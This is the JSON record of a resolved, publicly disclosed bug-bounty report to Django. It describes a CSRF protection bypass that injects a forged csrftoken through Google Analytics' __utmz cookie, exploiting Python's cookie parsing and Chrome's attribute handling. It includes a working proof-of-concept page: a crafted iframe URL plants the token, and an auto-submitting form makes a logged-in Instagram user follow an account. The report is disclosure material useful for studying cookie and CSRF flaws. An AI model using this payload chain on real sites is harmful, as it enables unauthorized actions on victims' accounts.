{
  "id": 26647,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjY0Nw==",
  "url": "https://hackerone.com/reports/26647",
  "title": "CSRF protection bypass on any Django powered site via Google Analytics",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-09-01T08:28:27.353Z",
  "submitted_at": "2014-09-01T08:28:27.353Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bobrov",
    "url": "/bobrov",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23,
    "url": "https://hackerone.com/django",
    "handle": "django",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Django",
      "twitter_handle": null,
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-09-26T19:29:10.967Z",
  "bug_reporter_agreed_on_going_public_at": "2016-09-26T19:29:10.830Z",
  "team_member_agreed_on_going_public_at": "2016-09-26T19:11:44.454Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I shall explain all the steps to create the final PoC in order to be more clear.\r\n\r\nPart 1. Cookie Injection via Google Analytics \r\n---------------------\r\n(Reported to Google, rewarded, still working)\r\n\r\n*   Google Analytics sets the cookie to track user source:\r\n   `__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]`\r\n   For example:\r\n   `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/`\r\n\r\n*   User fully controls path in Referer and it is not filtered before being put in __utmz\r\n\r\nPart 2. Cookie parsing peculiarities by different web servers\r\n---------------------\r\n*   A typical Cookie sent by a web browser looks like this: \r\n   Cookie: param1=value1; param2=value2;\r\n\r\n*   Many web servers accept cookies delimited not only by semicolons but also by commas: \r\n   Cookie: param1=value2, param2=value2\r\n   Cookie: param1=value2,param2=value2\r\n\r\n*   Python + Django handle cookies with incorrect regular expression that allows to use characters [ \\ ] as delimiters: \r\n   Cookie: param1=value1]param2=value2\r\n\r\nhttps://docs.python.org/3/library/http.cookies.html\r\nhttp://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\r\nhttp://tools.ietf.org/html/rfc2109\r\nhttp://tools.ietf.org/html/rfc2068\r\n\r\nExample:\r\n```\r\n>>> from http import cookies\r\n>>> C = cookies.SimpleCookie()\r\n>>> C.load('__utmz=blah]csrftoken=x')\r\n>>> C\r\n<SimpleCookie: csrftoken='x'>\r\n```\r\n\r\nPart 3. Cookie handling peculiarities in different web browsers \r\n---------------------\r\n(Reported to Google, won't fix)\r\n*   For all the web browsers except Safari characters of space, comma, and [ \\ ] can be used as cookie values\r\n\r\n*   Chrome handles only a limited number of cookie-attributes, e.g.: \r\n   Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;\r\n   will set cookie for .google.com but not for blah.blah.blah.google.com\r\n\r\nCombining all these facts\r\n---------------------\r\n\r\nProvided that:\r\n* A site uses Google Analytics\r\n* This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)\r\n* This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)\r\n\r\nThen:\r\n* We can set new arbitrary cookies or redefine the values of existing ones\r\n* This site is vulnerable to CSRF protection bypass\r\n\r\n\r\nThe principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute \"domain\" using the peculiarity that has been described in part 3 with the value \".site.com\".\r\n\r\nIn other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.\r\n\r\nPoC\r\n---------------------\r\n\r\nVulnerability exploitation on instagram.com with Google Chrome\r\n(Reported to Facebook, redirected to Django Team)\r\n\r\n* Open Google Chrome in incognito mode\r\n* Authenticate on instagram.com\r\n* Click the link and wait some seconds\r\n* Result - follow http://instagram.com/black2fan\r\n\r\nhttp://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\r\nSource:\r\n```\r\n<form \r\naction=\"http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed\" \r\nid=\"csrf\" \r\nmethod=\"POST\">\r\n      <input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"x\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n</form>\r\n\r\n<script>\r\n      function xxx() {\r\n        document.getElementById('csrf').submit();\r\n      }\r\n</script>\r\n\r\n<iframe \r\nonload=\"xxx()\" \r\nsrc=\"http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\"/>\r\n```\r\n\r\nDescription:\r\n*   A user authenticates on instagram.com\r\n\r\n*   We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn't have __utmz set on this subdomain:\r\n   http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\r\n   Cookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:\r\n   __utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,\r\n\r\n*   At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to \"x\"\r\n\r\n*   Submit follow form using CSRF-token \"x\"\r\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-10-26T19:11:44.538Z",
  "allow_singular_disclosure_after": -230314800.1827771,
  "singular_disclosure_allowed": true,
  "vote_count": 68,
  "voters": [
    "dirk",
    "stefanovettorazzi",
    "fransrosen",
    "cdl",
    "d1m0ck",
    "hogarth45",
    "zseano",
    "bogdantcaciuc",
    "bobrov",
    "harisec",
    "and 58 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
